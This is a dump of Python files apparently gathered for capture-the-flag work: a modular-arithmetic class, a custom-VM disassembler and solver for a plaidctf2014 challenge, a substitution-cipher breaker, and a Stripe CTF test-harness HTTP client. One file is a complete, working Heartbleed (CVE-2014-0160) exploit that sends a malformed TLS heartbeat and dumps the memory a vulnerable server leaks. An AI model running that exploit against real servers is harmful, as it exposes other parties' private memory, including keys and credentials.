      assert m is None or m == n.m, 'moduli do not match'
      self.value = n.value; self.m = n.m
      return
    else:
      assert isinstance(m, (int, long)), 'Modulus type must be int or Mod'
      assert m > 1, 'Need modulus > 1'
    assert isinstance(n, (int, long)), 'representative value must be int'
    self.m = m; self.value = n % m

  def __str__(self):   # used by str built-in function, which is used by print
    'Return an informal string representation of object'
    return "{0} mod {1}".format(self.value, self.m)

  def __repr__(self):  # used by repr built-in function
    'Return a formal string representation, usable in the Shell'
    return "Mod({0}, {1})".format(self.value, self.m)

  def sameParam(self, other):
    'True if other is a Mod with same modulus'
    return isinstance(other, Mod) and other.m == self.m

  def __add__(self, other): # used by + infix operand
    'Return self + other, if defined'
    other = self.tryLike(other)
    if other is None: return NotImplemented
    return Mod(self.value + other.value, self.m)

  def __sub__(self, other): # used by - infix operand
    'Return self - other, if defined'
    other = self.tryLike(other)
    if other is None: return NotImplemented
    return Mod(self.value - other.value, self.m)

  def __neg__(self):# used by - unary operand
    'Return -self'
    return Mod(-self.value, self.m)

  def __mul__(self, other): # used by * infix operand
    'Return self * other, if defined'
    other = self.tryLike(other)
    if other is None: return NotImplemented
    return Mod(self.value * other.value, self.m)

  def __div__(self,other):
    'Return self/other if other.inverse() is defined.'
    other = self.tryLike(other)
    if other is None: return NotImplemented
    return self * other.inverse()

  def __eq__(self, other): # used by == infix operand
    '''Return self == other, if defined
    Allow conversion of int to same Mod type before test.  Good idea?'''
    other = self.tryLike(other)
    if other is None: return NotImplemented
    return other.value == self.value

  def __ne__(self, other): # used by != infix operand
    'Return self != other, if defined'
    return not self == other

  # operations where only the second operand is a Mod (prefix r)
  def __radd__(self, other):
    'Return other + self, if defined, when other is not a Mod'
    return self + other # commutative, and now Mod first

  def __rsub__(self, other):
    'Return other - self, if defined, when other is not a Mod'
    return -self + other # can make definite Mod first

  def __rmul__(self, other):
    'Return other * self, if defined, when other is not a Mod'
    return self * other # commutative, and now Mod first

  def __rdiv__(self,other):
    'Return other/self if self.inverse() is defined.'
    return self.inverse() * other # can make definite Mod first

  def __pow__(self, n): # used by ** infix operator
    '''compute power using successive squaring for integer n
    Negative n allowed if self has an inverse.'''
    s = self  # s holds the current square
    if n < 0:
       s = s.inverse()
       n = abs(n)
    return Mod(pow(s.value, n, s.m), s.m)
    # algorithm (but not in C):
##    result = Mod(1, self.m)
##    while n > 0:
##       if n % 2 == 1:
##        result = s * result
##       s = s * s  # compute the next square
##       n = n//2  # compute the next quotient
##    return result

  def __int__(self):
    'Return lowest nonnegative integer representative.'
    return self.value

  def totCodes(self):
    '''Return number of elements in the group.
    This is an upper bound for likeFromInt.'''
    return self.m

  def likeFromInt(self, n):
    '''Int code to Mod object'''
    assert 0 <= n < self.m
    return Mod(n, self.m)

  def __nonzero__(self):
    """Returns True if the current value is nonzero.
    (Used for conversion to boolean.)
    """
    return self.value != 0

  def __hash__(self):
    ''' Hash value definition needed for use in dictionaries and sets.'''
    return hash(self.value)

  def modulus(self):
    '''Return the modulus.'''
    return self.m

  def inverse(self):
    '''Return the multiplicative inverse or else raise a ValueError.'''
    (g,x,y) = xgcd(self.value, self.m)
    if g == 1:
      return Mod(x, self.m)
    raise ValueError, 'Value not invertible'


def doctests():
  ''' More complete tests

  >>> Mod26 = ZMod(26)
  >>> x = Mod26(4)
  >>> y = Mod26(11)
  >>> z = Mod26(39)
  >>> x != y
  True
  >>> x != Mod26(4)
  False
  >>> x != 4
  False
  >>> print 5 - x
  1 mod 26
  >>> print y - 15
  22 mod 26
  >>> print 3*x
  12 mod 26
  >>> print 3+x
  7 mod 26
  >>> Mod26(2**100)  # tests long operand
  Mod(16, 26)
  >>> print y.inverse()
  19 mod 26
  >>> 1/x
  Traceback (most recent call last):
  ...
  ValueError: Value not invertible
  >>> 3 ** x
  Traceback (most recent call last):
  ...
  TypeError: unsupported operand type(s) for ** or pow(): 'int' and 'instance'
  >>> Mod26(2.3)
  Traceback (most recent call last):
  ...
  AssertionError: representative value must be int
  >>> print y**-1
  19 mod 26
  >>> print pow(y, -2)
  23 mod 26
  >>> s = set([x, y]) # uses hash
  >>> x in s
  True
  >>> bool(x)  # true if not 0
  True
  >>> bool(0*x)
  False
  >>> Mod(x, 7)
  Traceback (most recent call last):
  ...
  AssertionError: moduli do not match
  >>> Mod(3, 6.0)
  Traceback (most recent call last):
  ...
  AssertionError: Modulus type must be int or Mod
  >>> Mod(6.0, 3)
  Traceback (most recent call last):
  ...
  AssertionError: representative value must be int
  >>> print(Mod(3, x))
  3 mod 26
  >>> y.likeFromInt(int(x)) == x
  True
  >>> z = Mod(0, 3)
  >>> list(z.group())
  [Mod(0, 3), Mod(1, 3), Mod(2, 3)]
  >>> list((z+1).group(True))
  [Mod(2, 3), Mod(0, 3)]
  '''

if __name__ == '__main__':
  import doctest
  doctest.testmod() #verbose=True)

########NEW FILE########
__FILENAME__ = heartbleed
#!/usr/bin/env python
# coding=utf-8

# CVE-2014-0160 exploit PoC
# Originally from test code by Jared Stafford (jspenguin@jspenguin.org)

import sys
import struct
import socket
import time
import select
import re
from optparse import OptionParser

options = OptionParser(
	usage='%prog server [options]',
	description='Test for SSL heartbeat vulnerability (CVE-2014-0160)'
)
options.add_option(
	'-p', '--port', type='int', default=443,
	help='TCP port to test (default: 443)'
)

def h2bin(x):
	return x.replace(' ', '').replace('\n', '').decode('hex')

hello = h2bin('''
16 03 02 00 dc 01 00 00 d8 03 02 53
43 5b 90 9d 9b 72 0b bc 0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03 90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22 c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35 00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32 00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96 00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15 00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff 01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34 00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09 00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15 00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f 00 10 00 11 00 23 00 00
00 0f 00 01 01
''')

hb = h2bin('''
18 03 02 00 03
01 40 00
''')

def hexdump(s):
	for b in xrange(0, len(s), 16):
		lin = [c for c in s[b : b + 16]]
		hxdat = ' '.join('%02X' % ord(c) for c in lin)
		pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
		print '	%04x: %-48s %s' % (b, hxdat, pdat)
	print

def recvall(s, length, timeout=5):
	endtime = time.time() + timeout
	rdata = ''
	remain = length
	while remain > 0:
		rtime = endtime - time.time()
		if rtime < 0:
			return None
		r, w, e = select.select([s], [], [], 5)
		if s in r:
			data = s.recv(remain)
			# EOF?
			if not data:
				return None
			rdata += data
			remain -= len(data)
	return rdata


def recvmsg(s):
	hdr = recvall(s, 5)
	if hdr is None:
		print 'Unexpected EOF receiving record header; server closed connection'
		return None, None, None
	typ, ver, ln = struct.unpack('>BHH', hdr)
	pay = recvall(s, ln, 10)
	if pay is None:
		print 'Unexpected EOF receiving record payload; server closed connection'
		return None, None, None
	print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
	return typ, ver, pay

def hit_hb(s):
	s.send(hb)
	while True:
		typ, ver, pay = recvmsg(s)
		if typ is None:
			print 'No heartbeat response received; server likely not vulnerable'
			return False

		if typ == 24:
			print 'Received heartbeat response:'
			hexdump(pay)
			if len(pay) > 3:
				print 'WARNING: server returned more data than it should; server is vulnerable!'
			else:
				print 'Server processed malformed heartbeat, but did not return any extra data.'
			return True

		if typ == 21:
			print 'Received alert:'
			hexdump(pay)
			print 'Server returned error; likely not vulnerable'
			return False

def main():
	opts, args = options.parse_args()
	if len(args) < 1:
		options.print_help()
		return

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print 'Connecting...'
	sys.stdout.flush()
	s.connect((args[0], opts.port))
	print 'Sending Client Hello...'
	sys.stdout.flush()
	s.send(hello)
	print 'Waiting for Server Hello...'
	sys.stdout.flush()
	while True:
		typ, ver, pay = recvmsg(s)
		if typ == None:
			print 'Server closed connection without sending Server Hello.'
			return
		# Look for server hello done message.
		if typ == 22 and ord(pay[0]) == 0x0E:
			break

	print 'Sending heartbeat request...'
	sys.stdout.flush()
	s.send(hb)
	hit_hb(s)

if __name__ == '__main__':
	main()

########NEW FILE########
__FILENAME__ = disasm
import sys
import struct
import itertools


paris_code = '0000009a33319b00009c00ff9dff0080d88047dfaf0fd7ef3700807e26e626ef4e26b79e0002263f263e80f7dfc626b73e3f5313ff0f0026bf9a00019e21af80d5dd1212c30ff5ef56000fddef3f009b00009a0000a79d4d5a0febef65009b00009a0000a79badde9aefbea7'.decode('hex')


def inst_1byte(code, ip):
    inst = ord(code[ip])
    opcode = inst >> 3
    operand = inst & 7
    return opcode, operand


def inst_2byte(code, ip):
    inst = struct.unpack('>H', code[ip:ip+2])[0]
    opcode = inst >> 6
    op1, op2 = (inst >> 3) & 7, inst & 7
    return opcode, op1, op2


def inst_3byte(code, ip):
    inst = ord(code[ip+1]) + (ord(code[ip+2]) << 8) + (ord(code[ip]) << 16)
    opcode = inst >> 0x13
    op1, op2 = (inst >> 0x10) & 7, inst & 0xffff
    return opcode, op1, op2


def decode(code, ip):
    instructions = [
        (0x00, 1),
        (0x201, 2),
        (0x202, 2),
        (0x203, 2),
        (0x13, 3),
        (0x98, 2),
        (0x99, 2),
        (0x9a, 2),
        (0x9b, 2),
        (0x9, 1),
        (0x15, 1),
        (0x2, 1),
        (0x3f, 2),
        (0x1f, 3),
        (0x1d, 3),
        (0x7, 1),
        (0x18, 1),
        (0x1b, 1),
        (0x0a, 1),
        (0x14, 1)]
    for instopcode, instlen in instructions:
        if instlen == 1:
            opcode, operand = inst_1byte(code, ip)
            if instopcode == opcode:
                return instlen , opcode, [operand]
        elif instlen == 2:
            opcode, op1, op2 = inst_2byte(code, ip)
            if instopcode == opcode:
                return instlen, opcode, [op1, op2]
        elif instlen == 3:
            opcode, op1, op2 = inst_3byte(code, ip)
            if instopcode == opcode:
                return instlen, opcode, [op1, op2]


def reg(x):
    return 'r'+str(x)


def imm(x):
    return hex(x)


def mem(x):
    return 'word ['+str(x)+']'


def disassemble(opcode, operands):
    if opcode == 0x00:
        return 'nop'
    elif opcode == 0x201:
        return 'mov ' + reg(operands[1]) + ', ' + reg(operands[0])
    elif opcode == 0x202:
        return 'mov ' + mem(reg(operands[1])) + ', ' + reg(operands[0])
    elif opcode == 0x203:
        return 'mov ' + reg(operands[1]) + ', ' + mem(reg(operands[0]))
    elif opcode == 0x13:
        return 'mov ' + reg(operands[0]) + ', ' + imm(operands[1])
    elif opcode == 0x98:
        return 'add ' + reg(operands[1]) + ', ' + reg(operands[0])
    elif opcode == 0x99:
        return 'sub ' + reg(operands[1]) + ', ' + reg(operands[0])
    elif opcode == 0x9a:
        return 'xor ' + reg(operands[1]) + ', ' + reg(operands[0])
    elif opcode == 0x9b:
        return 'and ' + reg(operands[1]) + ', ' + reg(operands[0])
    elif opcode == 0x9:
        return 'shr ' + reg(operands[0]) + ', 8'
    elif opcode == 0x15:
        return 'not ' + reg(operands[0])
    elif opcode == 0x2:
        return 'inc ' + reg(operands[0])
    elif opcode == 0x3f:
        return 'cmp ' + reg(operands[1]) + ', ' + reg(operands[0])
    elif opcode == 0x1f:
        return 'jmp ' + imm(operands[1])
    elif opcode == 0x1d:
        return 'jz ' + imm(operands[1])
    elif opcode == 0x7:
        return 'push ' + reg(operands[0])
    elif opcode == 0x18:
        return 'pop ' + reg(operands[0])
    elif opcode == 0x1b:
        return 'bswap ' + reg(operands[0])
    elif opcode == 0xa:
        return 'xor200h ' + reg(operands[0])
    elif opcode == 0x14:
        return 'done'

########NEW FILE########
__FILENAME__ = messy
# super-messy solution for plaidctf2014/paris, too lazy to clean it up, please don't judge too harshly


xor_keys = 'a92df26d2e34aa557ac394cca211d8b9a5f0e28c54cb5d18d8795f3a159edaeafc772b914f2129261f608fc4be6387d8811e3f76e861eb94f6fa7447fb52ba537c596f513ec8ee2f3a69801acf7460cd0fc972c7f945ad9145954514cff5576f395ad83cdf96f0ce90be298efe67d77b8d4f22d97a764798504af7474c92634498d9342df8c295cad4bc89c6986416bcade20efdd0586d75c910d65b0f2abbcf323db44aff36b5d2274a91b8a60c333a35f266397f7afb4b35411ec250e14fd560b41e7de435dcfc3ba978f566ada05e9317db995961862f6f63f8f6effb94479b17d85d082640e91c73f51a4db48502e9cfcf1465ca74e7f99db61ac1a7f294'.decode('hex')
mem_200h = [0xaef2, 0x4f8b, 0xc349, 0xa3e5, 0x1aa3, 0xa52d, 0x7a90, 0x88e, 0xfe5, 0x6141, 0xd752, 0xc040, 0xa978, 0x2b5d, 0xc48b, 0xc233, 0xcb42, 0x8122, 0x3e77, 0xef09, 0x6ccb, 0xb0cf, 0xc4f4, 0x1075, 0x93c1, 0xd9ae, 0xec1d, 0x11e8, 0xdc16, 0x3b2d, 0x6c25, 0xc5b8, 0xc1c3, 0xa91c, 0x8518, 0xabe1, 0xd01d, 0xa00c, 0x43b9, 0xe397, 0xb585, 0x20db, 0xfc48, 0xcd1e, 0x5b79, 0xbdbb, 0xe302, 0xe432, 0xc063, 0x951d, 0x48ca, 0x9d63, 0x2287, 0xe9aa, 0x267e, 0xa26, 0x379b, 0x5450, 0x61cc, 0x7e13, 0xf85a, 0xf7bf, 0x4545, 0xab82, 0x6f1c, 0xe8ab, 0x4827, 0x2507, 0xab71, 0x2942, 0xc373, 0xe455, 0xf654, 0xd60b, 0x3917, 0xaeb5, 0x5ce8, 0x585, 0x2ce5, 0x3cdd, 0xda3b, 0x7d09, 0x42c4, 0x1286, 0x2b8b, 0x9972, 0x86f8, 0xc39d, 0x65f1, 0x2e85, 0x5305, 0x486f, 0x13ed, 0xab9c, 0x4468, 0x357, 0xa66a, 0x9ed7, 0xe6b9, 0xa316, 0xf627, 0x5acc, 0xcbc6, 0x6ea, 0xca05, 0x954f, 0x9390, 0x4272, 0xa3ce, 0x1a08, 0x2a47, 0xd0b8, 0x2976, 0x2486, 0xe562, 0xd032, 0xb27d, 0xc70d, 0xa7ad, 0x98ee, 0xb926, 0x9ddd, 0xa657, 0xe98b, 0x3e13, 0xe42, 0xaf3d, 0x19e4, 0x7d2b, 0x9017, 0x52c4, 0x5b9e, 0x96d4, 0x6d5f, 0xe7dc, 0x9908, 0xb2a, 0xe554, 0xe0a4, 0x7ca1, 0x5681, 0x2f2, 0x4676, 0xb64c, 0xe3da, 0x4af6, 0x7c0, 0x6b1b, 0x8a16, 0x6a0f, 0x180d, 0x8cf6, 0xb3cc, 0x6ac2, 0xe9bd, 0xe3d, 0x15f6, 0x4c7c, 0x6157, 0xa9f2, 0x5b08, 0x7206, 0x9b97, 0xf6fb, 0x7db0, 0x6989, 0x3daf, 0x93fd, 0xa0bd, 0x24c5, 0xe3d1, 0x8720, 0xbce9, 0x8d56, 0x7a2d, 0x66b3, 0xe95c, 0xc9da, 0x4bae, 0x53b0, 0x8f15, 0xf1f2, 0xa399, 0x283b, 0x5bcb, 0x319c, 0x7beb, 0xf1c2, 0x8c5b, 0xdcbf, 0x66c5, 0xb2b9, 0xdca6, 0x5226, 0x3039, 0x5564, 0x4b9b, 0xe100, 0xe041, 0x2b1, 0xde55, 0xeac9, 0x2d27, 0xd945, 0xd227, 0x3e17, 0xb488, 0xbd3e, 0xe4b0, 0x6825, 0x9b65, 0xdab, 0xa3fb, 0xdc2c, 0x58cf, 0x5898, 0xeaeb, 0x571, 0x60e1, 0x5695, 0xe6f0, 0x3b34, 0x287d, 0x4565, 0x270, 0xad37, 0x702a, 0x46b0, 0x9cef, 0xc0f8, 0x2d56, 0x3a49, 0x19c9, 0xb1f7, 0x2846, 0x64ef, 0x701, 0xbe58, 0xe7ec, 0x8db4, 0xb1d6, 0x9eac, 0x12f4, 0xbb9e, 0x337a, 0x9339, 0x3882, 0x3482, 0xc38c, 0x8800, 0x128e, 0xc39c, 0x624d, 0xdc2f, 0x5a7c, 0xa5aa]
desired_stack = [0x2e0b, 0x6d02, 0x7492, 0x870c, 0x93b9, 0xedb3, 0x312c, 0x7107, 0x7d10, 0x2007, 0xe7c6, 0x3a1b, 0xbad8, 0x9417, 0xfa6b, 0xbe6c, 0x621d, 0x4d3b, 0x47ad, 0x7a7a, 0x3e9d, 0x53a2, 0xf22f, 0xd1a9, 0xf574, 0x8173, 0x11bc, 0xae15, 0x6179, 0x5a4d]
desired_stack.reverse()


def xor_200h(k):
    k = (ord(xor_keys[k]) << 8) | ord(xor_keys[k])
    for i in xrange(len(mem_200h)):
        mem_200h[i] ^= k


def bruteforce(val):
    '''bruteforce candidate values to produce the desired index'''
    res = []
    printable = range(0x20, 0x80)
    for x in xrange(0x10000):
        c = (x - 0x3332) & 0xffff
        hi = c >> 8
        lo = c & 0xff
        if hi ^ lo == val and (x >> 8) in printable and (x & 0xff) in printable:
            res.append(x)
    return res


# generate lists of lists of possible first/second character for each stack value
first_chars_lists = []
second_chars_lists = []
for i in xrange(0, len(desired_stack)-1):
    val = mem_200h.index(desired_stack[i+1] ^ desired_stack[i])
    first, second = zip(*map(lambda x: (x >> 8, x & 0xff), bruteforce(val)))
    first_chars_lists.append(map(chr, first))
    second_chars_lists.append(map(chr, second))
    xor_200h(i)


# backtrack and generate the solution based on the lists
def recursive(c, first_chars_lists, second_chars_lists):
    if len(first_chars_lists) == 1:
        if c in first_chars_lists[0]:
            return c, second_chars_lists[first_chars_lists[0].index(c)]
        else:
            return None
    else:
        if c in first_chars_lists[0]:
            return c, recursive(second_chars_lists[0][first_chars_lists[0].index(c)], first_chars_lists[1:], second_chars_lists[1:])
        else:
            return None


for c in first_chars_lists[0]:
    print recursive(c, first_chars_lists, second_chars_lists)

########NEW FILE########
__FILENAME__ = cipher_solver
import random
from ngram_score import ngram_score
import re

# load our quadgram model
with open ('quadgrams.txt', 'r') as ngram_file:
	ngrams = ngram_file.readlines()
fitness = ngram_score(ngrams)

# helper function, converts an integer 0-25 into a character
def i2a(i): return 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'[i%26]

# decipher a piece of text using the substitution cipher and a certain key
def sub_decipher(text,key):
	invkey = [i2a(key.index(i)) for i in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ']
	ret = ''
	for c in text:
		if c.isalpha(): ret += invkey[ord(c.upper())-ord('A')]
		else: ret += c
	return ret

def break_simplesub(ctext,startkey=None):
	''' perform hill-climbing with a single start. This function may have to be called many times
		to break a substitution cipher. '''
	# make sure ciphertext has all spacing/punc removed and is uppercase
	ctext = re.sub('[^A-Z]','',ctext.upper())
	parentkey,parentscore = startkey or list('ABCDEFGHIJKLMNOPQRSTUVWXYZ'),-99e99
	if not startkey: random.shuffle(parentkey)
	parentscore = fitness.score(sub_decipher(ctext,parentkey))
	count = 0
	while count < 1000:
		a = random.randint(0,25)
		b = random.randint(0,25)
		child = parentkey[:]
		# swap two characters in the child
		child[a],child[b] = child[b],child[a]
		score = fitness.score(sub_decipher(ctext,child))
		# if the child was better, replace the parent with it
		if score > parentscore:
			parentscore, parentkey = score, child[:]
			count = 0 # reset the counter
		count += 1
	return parentscore, parentkey

ctext = 'fvoxoxfvwdepagxmwxfpukleofxhwevefuygzepfvexwfvufgeyfryedojhwffoyhxcwgmlxeylawfxfurwfvoxecfezfvwbecpfpeejuygoyfefvwxfpwwfxojumwuxfuffvwawuxflecaazubwjwoyfvwyepfvwuxfhwfjlopwckaohvfjlzopwoaahevupgwpfvuywjoywjdwyfufjupouvbuaajwuaoupkecygjwoyfvwuxxdofvyeacmwbvuzoyhlecpwzcbroyhdofvfvwgcgwdveheffvwrwlxfelecpxuzwuygfvexwfvufbuyfgempoyhxcofxbplfelecpcybawxujfexwffawgoxkcfwxfvechvflecgfubrawfvoxdofvuaoffawjepwfubfmcffvwyuhuoyzcghwkubrwpxogeyfryediubroxvwgufwupwswplfojwofvoyrezaorxuyhmcfxvofjuyfvwlpwubepkepufoeyuygojukwpxeyozobufoeyezzpwwgejzepuaaleczoaagebrwfxaorwfvufxubeybwkfzepwohyfeluaadvoawaudlwpxjcggldufwpuygfpexxfuaaecfezmcxoywxxoxiuoazepjwuyglecpwxcoyhjwbosoaalwnvomoffvoxoyfvwbecpfpeejheeygeofogupwlecbeyhpufcaufoeyxfvwzauhoxxoybwywdbplkfejohvfvuswyxumubrgeepxocxweagbplkfe'

print "Substitution Cipher solver, you may have to wait several iterations"
print "for the correct result. Press ctrl+c to exit program."
# keep going until we are killed by the user
i = 0
maxscore = -99e99
while 1:
	i += 1 # keep track of how many iterations we have done
	score, key = break_simplesub(ctext,list('ABCDEFGHIJKLMNOPQRSTUVWXYZ'))
	if score > maxscore:
		maxscore,maxkey = score,key[:]
		print '\nbest score so far:',maxscore,'on iteration',i
		print '	best key: '+''.join(maxkey)
		print '	plaintext: '+ sub_decipher(ctext,maxkey)

########NEW FILE########
__FILENAME__ = ngram_score
'''
Allows scoring of text using n-gram probabilities
17/07/12
'''
from math import log10

class ngram_score(object):
	def __init__(self, ngram_list, sep=' '):
		''' load a file containing ngrams and counts, calculate log probabilities '''
		self.ngrams = {}
		for line in ngram_list:
			key, count = line.split(sep)
			self.ngrams[key] = int(count)
		self.L = len(key)
		self.N = sum(self.ngrams.itervalues())
		#calculate log probabilities
		for key in self.ngrams.keys():
			self.ngrams[key] = log10(float(self.ngrams[key]) / self.N)
		self.floor = log10(0.01 / self.N)

	def score(self, text):
		''' compute the score of text '''
		score = 0
		for i in xrange(len(text) - self.L + 1):
			score += self.ngrams.get(text[i:i + self.L], self.floor)
		return score

########NEW FILE########
__FILENAME__ = error
# Exceptions
class StripeError(Exception):
    pass

class HTTPConnectionError(StripeError):
    pass

########NEW FILE########
__FILENAME__ = http_client
import os
import sys
import textwrap

# From this package
import lib.error as error
import lib.util as util

# This is a port of http_client from [Stripe-Python](https://github.com/stripe/stripe-python)

# - Requests is the preferred HTTP library
# - Use Pycurl if it's there (at least it verifies SSL certs)
# - Fall back to urllib2 with a warning if needed

try:
    if sys.version_info < (3,0):
        import urllib2 as urllib_request
    else:
        import urllib.request as urllib_request
except ImportError:
    pass

try:
    import pycurl
except ImportError:
    pycurl = None

try:
    import requests
except ImportError:
    requests = None
else:
    try:
        # Require version 0.8.8, but don't want to depend on distutils
        version = requests.__version__
        major, minor, patch = [int(i) for i in version.split('.')]
    except Exception:
        # Probably some new-fangled version, so it should support verify
        pass
    else:
        if (major, minor, patch) < (0, 8, 8):
            util.logger.warn(
                'Warning: the test harness will only use your Python "requests"'
                'library if it is version 0.8.8 or newer, but your '
                '"requests" library is version %s. We will fall back to '
                'an alternate HTTP library so everything should work. We '
                'recommend upgrading your "requests" library. (HINT: running '
                '"pip install -U requests" should upgrade your requests '
                'library to the latest version.)' % (version,))
            requests = None

def certs_path():
    return os.path.join(os.path.dirname(__file__), 'ca-certificates.crt')


def new_default_http_client(*args, **kwargs):
    if requests:
        impl = RequestsClient
    elif pycurl and sys.version_info < (3,0):
        # Officially supports in 3.1-3.3 but not 3.0. The idea is that for >=2.6
        # you should use requests
        impl = PycurlClient
    else:
        impl = Urllib2Client
        if sys.version_info < (2,6):
            reccomendation = "pycurl"
        else:
            reccomendation = "requests"
        util.logger.info(
            "Warning: The test harness is falling back to *urllib2*. "
            "Its SSL implementation doesn't verify server "
            "certificates (how's that for a distributed systems problem?). "
            "We recommend instead installing %(rec)s via `pip install %(rec)s`.",
            {'rec': reccomendation})

    return impl(*args, **kwargs)


class HTTPClient(object):

    def __init__(self, headers={}, verify_ssl_certs=True):
        self._verify_ssl_certs = verify_ssl_certs
        self.headers = headers

    def request(self, method, url, post_data=None):
        raise NotImplementedError(
            'HTTPClient subclasses must implement `request`')


class RequestsClient(HTTPClient):
    name = 'requests'

    def request(self, method, url, post_data=None):
        kwargs = {}

        if self._verify_ssl_certs:
            kwargs['verify'] = certs_path()
        else:
            kwargs['verify'] = False

        try:
            try:
                result = requests.request(method,
                                          url,
                                          headers=self.headers,
                                          data=post_data,
                                          timeout=80,
                                          **kwargs)
            except TypeError:
                e = util.exception_as()
                raise TypeError(
                    'Warning: It looks like your installed version of the '
                    '"requests" library is not compatible with Stripe\'s '
                    'usage thereof. (HINT: The most likely cause is that '
                    'your "requests" library is out of date. You can fix '
                    'that by running "pip install -U requests".) The '
                    'underlying error was: %s' % (e,))

            # This causes the content to actually be read, which could cause
            # e.g. a socket timeout. TODO: The other fetch methods probably
            # are succeptible to the same and should be updated.
            content = result.content
            status_code = result.status_code
        except Exception:
            # Would catch just requests.exceptions.RequestException, but can
            # also raise ValueError, RuntimeError, etc.
            e = util.exception_as()
            self._handle_request_error(e)
        if sys.version_info >= (3, 0):
            content = content.decode('utf-8')
        return content, status_code

    def _handle_request_error(self, e):
        if isinstance(e, requests.exceptions.RequestException):
            err = "%s: %s" % (type(e).__name__, str(e))
        else:
            err = "A %s was raised" % (type(e).__name__,)
            if str(e):
                err += " with error message %s" % (str(e),)
            else:
                err += " with no error message"
        msg = "Network error: %s" % (err,)
        raise error.HTTPConnectionError(msg)

class PycurlClient(HTTPClient):
    name = 'pycurl'

    def request(self, method, url, post_data=None):
        s = util.StringIO.StringIO()
        curl = pycurl.Curl()

        if method == 'get':
            curl.setopt(pycurl.HTTPGET, 1)
        elif method == 'post':
            curl.setopt(pycurl.POST, 1)
            curl.setopt(pycurl.POSTFIELDS, post_data)
        else:
            curl.setopt(pycurl.CUSTOMREQUEST, method.upper())

        # pycurl doesn't like unicode URLs
        curl.setopt(pycurl.URL, util.utf8(url))

        curl.setopt(pycurl.WRITEFUNCTION, s.write)
        curl.setopt(pycurl.NOSIGNAL, 1)
        curl.setopt(pycurl.CONNECTTIMEOUT, 30)
        curl.setopt(pycurl.TIMEOUT, 80)
        curl.setopt(pycurl.HTTPHEADER, ['%s: %s' % (k, v)
                    for k, v in self.headers.iteritems()])
        if self._verify_ssl_certs:
            curl.setopt(pycurl.CAINFO, certs_path())
        else:
            curl.setopt(pycurl.SSL_VERIFYHOST, False)

        try:
            curl.perform()
        except pycurl.error:
            e = util.exception_as()
            self._handle_request_error(e)
        rbody = s.getvalue()
        rcode = curl.getinfo(pycurl.RESPONSE_CODE)
        return rbody, rcode

    def _handle_request_error(self, e):
        error_code = e[0]
        if error_code in [pycurl.E_COULDNT_CONNECT,
                          pycurl.E_COULDNT_RESOLVE_HOST,
                          pycurl.E_OPERATION_TIMEOUTED]:
            msg = ("Test harness could not connect to Stripe. Please check "
                   "your internet connection and try again.")
        elif (error_code in [pycurl.E_SSL_CACERT,
                             pycurl.E_SSL_PEER_CERTIFICATE]):
            msg = "Could not verify host's SSL certificate."
        else:
            msg = ""
        msg = textwrap.fill(msg) + "\n\nNetwork error: %s" % e[1]
        raise error.HTTPConnectionError(msg)


class Urllib2Client(HTTPClient):
    if sys.version_info >= (3, 0):
        name = 'urllib.request'
    else:
        name = 'urllib2'

    def request(self, method, url, post_data=None):
        if sys.version_info >= (3, 0) and isinstance(post_data, str):
            post_data = post_data.encode('utf-8')

        req = urllib_request.Request(url, post_data, self.headers)

        if method not in ('get', 'post'):
            req.get_method = lambda: method.upper()

        try:
            response = urllib_request.urlopen(req)
            rbody = response.read()
            rcode = response.code
        except urllib_request.HTTPError:
            e = util.exception_as()
            rcode = e.code
            rbody = e.read()
        except (urllib_request.URLError, ValueError):
            e = util.exception_as()
            self._handle_request_error(e)
        if sys.version_info >= (3, 0):
            rbody = rbody.decode('utf-8')
        return rbody, rcode

    def _handle_request_error(self, e):
        msg = "Network error: %s" % str(e)
        raise error.HTTPConnectionError(msg)

########NEW FILE########
__FILENAME__ = test_framework
import difflib
import os.path
from random import SystemRandom
import re
import subprocess
import sys
import time

# From this package
import lib.error as error
import lib.http_client as http_client
import lib.util as util

data_directory = os.path.join(os.path.dirname(__file__), "..", "data")

class TestCase(object):
    def __init__(self, harness, id_or_url):
        self.harness = harness
        self.id, self.url = self.normalize_id_and_url(id_or_url)
        self.json = None

    def normalize_id_and_url(self, id_or_url):
        if re.match("\Ahttps?:", id_or_url):
            url = id_or_url
            # Look at the last component and remove extension
            id = id_or_url.split('/')[-1].split('.')[0]
        else:
            id = id_or_url
            level = self.harness.LEVEL
            url = "https://stripe-ctf-3.s3.amazonaws.com/level%s/%s.json" % (level, id)
        return id, url

    def dump_path(self):
        return os.path.join(self.harness.test_cases_path(), self.id + ".json")

    def load(self):
        if self.json: return self.json
        try:
            f = open(self.dump_path(), "r")
            self.json = util.json.load(f)
            f.close()
            return self.json
        except IOError:
            pass
        util.logger.info('Fetching. URL: %s', self.url)
        content = self.harness.fetch_s3_resource(self.url)
        try:
            self.json = util.json.loads(content)
        except ValueError:
            # Decoding the JSON failed.
            msg = ("There was a problem parsing the test case. We expected "
                   "JSON. We received: %s" % (content,))
            raise error.StripeError(msg)
        return self.json

    def flush(self):
        f = open(os.path.join(self.harness.test_cases_path(), self.id + ".json"), "w")
        util.json.dump(self.json, f)
        f.close()

class AbstractHarness(object):
    def __init__(self, ids_or_urls=[], options={}):
        util.mkdir_p(self.test_cases_path())
        if not os.path.isfile(http_client.certs_path()):
            msg = ("You seem to have deleted the file of certificates "
                   "that shipped with this repo. It should exist "
                   "at %s" % http_client.certs_path())
            raise error.StripeError(msg)
        if ids_or_urls == []:
            util.logger.info('No test case supplied. Randomly choosing among defaults.')
            ids_or_urls = [SystemRandom().choice(self.DEFAULT_TEST_CASES)]
